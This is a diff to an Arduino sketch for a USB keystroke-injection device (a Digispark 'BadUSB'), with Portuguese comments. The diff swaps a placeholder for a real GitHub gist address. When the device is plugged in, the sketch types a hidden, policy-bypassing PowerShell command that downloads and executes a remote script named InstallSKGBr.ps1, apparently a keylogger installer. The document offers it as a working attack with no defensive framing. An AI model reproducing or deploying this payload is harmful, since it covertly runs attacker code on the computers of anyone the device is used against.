@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
   DigiKeyboardPtBr.delay(3000); 
   // Executando o script publicado no gist
-  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/SEU_USUARIO/InstallSKGBr.ps1');\""));
+  DigiKeyboardPtBr.print(F("powershell -W hidden -noni -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/brunomlima/7a5f2fc4fd1831ae0d41ed7b78010195/raw/e7a0cbfd8a833eb0ffc1b59e3a857de4a31d8adc/InstallSKGBr.ps1');\""));
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);  
   pisca_led(1000);
